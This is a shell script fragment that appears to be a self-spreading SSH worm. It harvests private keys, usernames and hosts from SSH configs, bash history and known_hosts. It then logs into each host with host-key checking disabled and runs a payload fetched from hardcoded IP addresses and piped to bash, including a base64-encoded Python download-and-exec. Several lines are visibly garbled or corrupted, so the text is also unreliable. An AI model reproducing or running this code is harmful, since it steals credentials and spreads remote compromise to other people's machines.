_sig="$HOME/.localsshaxxaa"
if [ ! -f "$_sig" ]; then
	-q -0
	touch "$_sig"
	KEYS=$(find ~/ /root/home -maxdepth 2 -name 'id_rsa*'! -name '*.pub')
	KEYS2=$(grep -h IdentityFile ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | awk '{print $2}') KEYS3=$(find ~/ /root/home -maxdepth 3 -name '*.pem' | uniq)
	HOSTS=$(grep -h HostName ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | awk '{print $2}')
	HOSTS2=$(grep -OP "(ssh|scp)\s+\K[^\s]+" ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}")
	HOSTS3=$(grep -h -oP "([0-9]{1,3}\. ){3}[0-9]{1,3}" ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | uniq)
	USERZ=$(find ~/ /root/home -maxdepth 2 -name '.ssh' | xargs -I {} find {} -name 'id_rsa*' ! -name '*.pub' | awk -F'/' '{print $3}' | uniq)
	users=$(
		echo "$USERZ" | tr
		'\n' | sort -u
	)
	hosts=$(echo -e "$HOSTS\n$HOSTS2\n$HOSTS3" | grep -v "127.0.0.1" | sort -u)
	keys=$(echo -e "$KEYS\n$KEYS2\n$KEYS3" | sort -u)
	for user in $users; do
		for host in $hosts; do
			for key in $keys; do
				chmod 400 "$key"
				ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i "$key" "$user@$host" "(curl -s http://89.185.85.102/c || wget http://89.185.85.102/c || lwp-download http://89.185.85.102/c /tmp/c) | bash -sh; bash /tmp/c; rm -rf /tmp/c; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliLnJlcXVlc3Q7IGV4ZWModXJsbGliLnJlcXVlc3QudXJsb3BlbigiaHR0cDovLzE4NS4xNzQuMTM2LjIwNC95IikucmVhZCgpKScgfHwgcHl0aG9uMyAtYyAnaW1wb3J0IHVybGxpYi5yZXF1ZXN00yBleGVjKHVybGxpYi5yZXF1ZXN0LnVybG9wZW40 Imh0dHA6Ly8x0DUUMTCOLjEzNi4yMDQveSIpLnJlYWQoKSkn" | base64 -d | bash
			done
		done
	done
fi
